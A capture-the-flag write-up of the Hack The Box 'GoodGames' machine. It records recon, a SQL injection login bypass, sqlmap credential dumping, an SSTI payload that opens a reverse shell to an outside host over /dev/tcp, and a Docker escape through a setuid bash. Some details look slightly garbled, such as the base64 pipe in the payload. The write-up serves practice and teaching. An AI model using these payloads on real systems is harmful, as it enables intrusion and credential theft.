@@ -1,0 +1,158 @@
+# GoodGames Write-Up
+
+Target: 10.10.11.130
+
+---
+
+## Introduction
+- Objective: Obtain the user and root flag
+- Tools: Nmap, Wappalyzer, Burp Suite, SQLMap, Hashcat, Netcat, SSH, Docker
+
+---
+
+## Initial Reconnaissance
+	- Port Scanning: Nmap scan
+		- Command: nmap -sC -sV -vv 10.10.11.130
+		- Output: 
+			80/tcp open  http    Apache httpd 2.4.51 (Werkzeug/2.0.2 Python/3.0.2)
+	- Observations: Host: goodgames.htb
+
+---
+
+## Enumeration
+	- Service Exploration:
+		- Service 1: Web Server (Apache/Werkzeug)
+			- Command: Visit http://10.10.11.130:80 in browser
+			- Output: GoodGames Community and Store (Blog, Store pages, email subscription form)
+		- Service 2: Wappalyzer
+			- Command: Run Wappalyzer on http://10.10.11.130
+			- Output: 
+				Photo Galleries: Photoswipe
+				Miscellaneous: Popper
+				Databases: MySQL
+				JavaScript frameworks: GSAP
+				Web servers: Flask
+				JavaScript libraries: SoundManager, Photoswipe, Flickity, Moment.js, jQuery, Hammer.js
+		- Service 3: Gobuster VHost Scan
+			- Command: gobuster vhost -u http://10.10.11.130/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
+			- Output: Nothing
+	- Manual Checks: 
+		- Added goodgames.htb to /etc/hosts
+		- Attempted email subscription form, no exploitable results
+		- Captured cookies via browser:
+			VISITOR_INFO1_LIVE: ShlIKfMBdbY
+			VISITOR_PRIVACY_METADATA: CgJVUxIEGgAgZg%3D%3D
+			YSC: gfEo-FYPVO8
+			_Secure-ROLLOUT_TOKEN: CLe-yc6ojtqb5QEQ0sbg-byMjAMY0sbg-byMjAM%3D
+	- Key Findings: 
+		- Flask-based web server with MySQL database
+		- Cookies captured, but session manipulation failed
+
+---
+
+## Exploitation
+	- Initial Access: SQL Injection on Login Page
+		- Command: Capture login request in Burp Suite, test SQL injection
+			Email: ' OR '1'='1' -- -
+			Password: (any)
+		- Output: Login successful as admin
+		- Command: python3 sqlmap.py -r goodgames.req -dbs -o
+			- Output: Databases: main, information_schema
+		- Command: python3 sqlmap.py -r goodgames.req -D main --tables
+			- Output: Tables: user, blog, blog_comments
+		- Command: python3 sqlmap.py -r goodgames.req -D main -T user --columns
+			- Output: Columns: name, email, id, password
+		- Command: python3 sqlmap.py -r goodgames.req -D main -T user -C email,password --dump
+			- Output: 
+				admin@goodgames.htb: 2b22337f218b2d82dfc3b6f77e7cb8ec (cracked: superadministrator)
+				pwninx@hackthebox.eu: 3af5fc3e07f3b551c4668855284dc118
+	- Shell Access: SSTI Reverse Shell
+		- Command: Login to http://internal-administration.goodgames.htb/login
+			Username: admin
+			Password: superadministrator
+		- Command: Set up listener: nc -lvnp 4444
+		- Command: Inject SSTI payload in Maltrail settings (name field):
+			{{config.class.init.globals['os'].popen('echo "bash -i >& /dev/tcp/10.10.16.6/4444 0>&1" | base64 -d | bash').read()}}
+		- Output: 
+			connect to [10.10.16.6] from (UNKNOWN) [10.10.11.130] <port>
+			root@3a453ab39d3d:/home/augustus#
+
+## User Flag
+	- Command: cd /home/augustus && cat user.txt
+	- Output: 49fbb3cf0f5f1aacde6481db97afae5f
+
+---
+
+## Privilege Escalation
+	- Step 1: Information Gathering:
+		- System Info: 
+			- Command: Not provided
+			- Output: Not provided (inferred: Ubuntu)
+		- User Context:
+			- Command: ls -la /home/augustus
+			- Output: drwxr-xr-x 2 1000 1000 4096 (owned by user 1000 on host)
+		- Automated Tools:
+			- Command: Not used
+			- Output: Not used
+	- Step 2: Identify Vectors:
+		- SUID Binaries:
+			- Command: Not provided
+			- Output: Not provided
+		- Cron Jobs:
+			- Command: Not provided
+			- Output: Not provided
+		- Kernel Exploits:
+			- Command: Not provided
+			- Output: Not provided
+		- Misconfigurations:
+			- Command: ifconfig
+			- Output: Container IP: 172.19.0.2, netmask: 255.255.0.0
+	- Step 3: Exploit the Vector: Docker Breakout
+		- Command: for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
+			- Output: All ports open, including 22/SSH
+		- Command: script /dev/null -c bash
+		- Command: ssh augustus@172.19.0.1
+			Password: superadministrator
+		- Command: In container: cp /bin/bash /home/augustus/bash
+			- Command: chown root:root bash
+			- Command: chmod 4755 bash
+		- Command: On host: ./bash -p
+			- Output: root@<host>:/home/augustus#
+	- Step 4: Verify Access:
+		- Command: whoami
+		- Output: root
+
+---
+
+## Post-Exploitation
+	- Flag Retrieval:
+		- Command: cd /root && cat root.txt
+		- Output: ebfc66f7ea37fadb6f03f2b9a7f17a21
+	- Persistence (Optional): Not implemented
+	- Evidence: Not provided
+
+---
+
+## Conclusion
+- Summary: In "GoodGames" (10.10.11.130), I used Nmap to find port 80 (Apache/Werkzeug). SQL injection on the login page (' OR '1'='1' -- -) granted admin access. SQLMap enumerated the main database, revealing admin credentials (admin@goodgames.htb:superadministrator). I used SSTI to gain a root shell in a Docker container via http://internal-administration.goodgames.htb, retrieving the user flag (49fbb3cf0f5f1aacde6481db97afae5f). I broke out of the container by mounting a setuid bash binary, gaining root on the host and obtaining the root flag (ebfc66f7ea37fadb6f03f2b9a7f17a21).
+- Lessons Learned: I need to improve my SQL injection syntax—I missed the trailing dash in ' OR '1'='1' -- -, which cost me time. I should’ve used SQLMap’s --dump more efficiently instead of iterating commands. SSTI payloads are tricky; I need to practice crafting them without help. Docker breakouts are new to me, so I need to study container escapes more. I also should’ve checked for subdomains earlier, as internal-administration.goodgames.htb was key.
+- Fixes:
+	- Patch Flask for SQL Injection: Sanitize user inputs to prevent SQL injection on login forms.
+	- Secure Admin Credentials: Avoid storing weak passwords (superadministrator); use strong, unique credentials.
+	- Patch Flask for SSTI: Escape user inputs in Flask templates to prevent SSTI vulnerabilities.
+	- Isolate Docker Containers: Restrict container access to host filesystems to prevent mounting exploits.
+	- Restrict SSH Access: Limit SSH access to internal-administration.goodgames.htb with IP whitelisting.
+
+---
+
+## Appendix
+- Additional Details: Found a Google Spreadsheet link in Maltrail source code, unrelated to CTF.
+- Tools and Exploits:
+	- Nmap
+	- Wappalyzer
+	- Burp Suite
+	- SQLMap
+	- Hashcat
+	- Netcat
+	- SSH
+	- Docker Breakout (via mounted setuid binary)
